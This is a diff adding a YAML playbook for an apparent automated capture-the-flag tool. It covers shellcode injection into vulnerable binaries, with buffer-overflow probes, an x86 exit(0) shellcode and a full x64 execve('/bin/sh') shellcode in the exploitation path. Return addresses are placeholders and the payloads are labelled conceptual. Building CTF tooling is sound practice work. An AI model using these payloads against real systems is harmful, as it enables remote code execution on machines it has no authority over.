@@ -1,0 +1,99 @@
+id: pwn_shellcode_injection
+name: Shellcode Injection
+category: pwn
+version: "1.0"
+author: system
+description: >
+  Injects machine code (shellcode) into a vulnerable process's memory and redirects
+  execution to it, typically to spawn a shell or execute arbitrary commands.
+  Often used after bypassing NX/DEP and ASLR.
+
+applies_when:
+  - "context.challenge.type == 'pwn'"
+
+min_confidence: 0.10
+stop_on_flag: true
+
+confidence_seeds:
+  - if: "any(t in context.tech_stack for t in ['c', 'cpp', 'assembly', 'linux'])"
+    boost: 0.20
+    label: "C/C++/Assembly binary detected"
+  - if: "context.binary_properties.nx_enabled == false" # Hypothetical context property
+    boost: 0.30
+    label: "No-Execute (NX) bit disabled (executable stack/heap)"
+  - if: "context.binary_properties.aslr_enabled == false" # Hypothetical context property
+    boost: 0.25
+    label: "ASLR disabled, simpler address targeting"
+
+detection_paths:
+  - id: buffer_overflow_shellcode_test_probe
+    name: Buffer Overflow with Shellcode Test Probe
+    description: >
+      Sends a buffer overflow payload containing a NOP sled and a simple breakpoint
+      instruction (`\xcc` for x86/x64) to detect if control flow can be redirected
+      to injected code.
+    min_confidence: 0.15
+    steps:
+      - id: send_nop_sled_int3_payload
+        action: http_probe # Placeholder for binary interaction
+        params:
+          method: POST
+          path: '/input_service' # Example endpoint for interaction
+          # Conceptual payload: padding + NOP sled + INT3 (breakpoint) + return address
+          body: 'A' * 100 + '\x90' * 50 + '\xcc' + 'BBBBBBBB' # 100 A's, 50 NOPs, INT3, return address placeholder
+        signals:
+          - match: '(?i)debugger attached|process stopped|segmentation fault' # Indicators of breakpoint/crash
+            on_match:
+              confidence_boost: 0.45
+              emit: shellcode_redirection_potential
+          - match: '500 Internal Server Error'
+            on_match:
+              confidence_boost: 0.30
+              emit: shellcode_test_crash
+
+  - id: simple_rwx_check_probe
+    name: Simple RWX Memory Check Probe
+    description: >
+      If a buffer overflow is known, attempt to inject a minimal executable payload
+      (e.g., `_exit(0)` or similar) and observe for program termination without a crash,
+      suggesting executable memory regions.
+    min_confidence: 0.20
+    steps:
+      - id: send_exit_shellcode
+        action: http_probe # Placeholder for binary interaction
+        params:
+          method: POST
+          path: '/input_service'
+          # Conceptual payload: padding + _exit(0) shellcode + return address
+          body: 'A' * 100 + '\x31\xc0\xb0\x01\x31\xdb\xcd\x80' + 'BBBBBBBB' # NOP sled + exit(0) for x86
+        signals:
+          - match: '(?i)connection closed|program terminated' # If the program cleanly exits
+            on_match:
+              confidence_boost: 0.40
+              emit: rwx_memory_confirmed
+
+exploitation_paths:
+  - id: rce_via_shellcode
+    name: RCE via Shellcode Injection
+    requires_signal: shellcode_redirection_potential # Or rwx_memory_confirmed
+    technique: full_shellcode_execution
+    description: >
+      Control flow redirection and/or executable memory regions were identified.
+      This path outlines constructing and injecting a full `/bin/sh` shellcode payload
+      to achieve Remote Code Execution.
+    steps:
+      - id: construct_and_send_full_shellcode
+        action: http_probe # Placeholder for binary interaction
+        params:
+          method: POST
+          path: '/input_service'
+          # Conceptual payload: padding + NOP sled + /bin/sh shellcode + return address
+          # Example x64 execve("/bin/sh") shellcode (null-free)
+          body: 'A' * 100 + '\x90' * 10 + '\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x57\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\xb0\x3b\x0f\x05' + 'BBBBBBBB'
+        capture:
+          - pattern: 'flag\{[^}]+\}'
+            as: flag_value
+          - pattern: 'CTF\{[^}]+\}'
+            as: flag_value
+          - pattern: '(?i)whoami|uid=\d+' # Confirm shell execution
+            as: shell_access_confirmed
